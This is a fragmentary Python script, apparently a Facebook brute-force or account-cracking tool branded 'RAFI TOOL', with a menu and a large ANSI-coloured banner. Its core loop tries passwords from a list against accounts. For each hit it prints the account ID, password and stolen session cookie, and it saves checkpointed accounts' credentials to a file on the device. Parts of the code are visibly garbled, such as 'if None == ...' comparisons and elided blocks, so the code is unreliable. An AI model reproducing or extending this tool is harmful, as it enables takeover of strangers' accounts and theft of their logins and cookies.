...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] SUBSCRIBE MY MAIN CHANNEL')
    print(' [2] EXIT')
...
def o():
    ...
    jalan(' \x1b[1;32m[4] \x1b[1;32mFLOW MY FB PAGE')
    ...
    if None == '3':
        ...
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/bisaktoabeg.story/')
        return None
    if None == '0':
        os.system('exit')
        return None
...
today = date.today()
logo =                                          ("""   
\033[1;32m       ooooo   ooooo ooooooooooooo  
\033[1;35m       `888'   `888' 8'   888   `8 
\033[1;35m       888     888       888.      
\033[1;32m       888ooooo888       888    
\033[1;32m       888     888       888   
\033[1;35m       888     888       888  
\033[1;35m       o888o   o888o     o888o 
 
\033[1;37m================= \33[32;45mRAFI\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mRAFI\33[0;m\033[1;32m && \033[1;33mRAFI\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MR RAFI
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMR-ZIHAD
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mANTI_VIRUS
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m,1.0
\033[1;37m================= \33[32;45mRAFI\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO RAFI TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(RAFI-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(RAFI-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RAFI-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[RAFI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
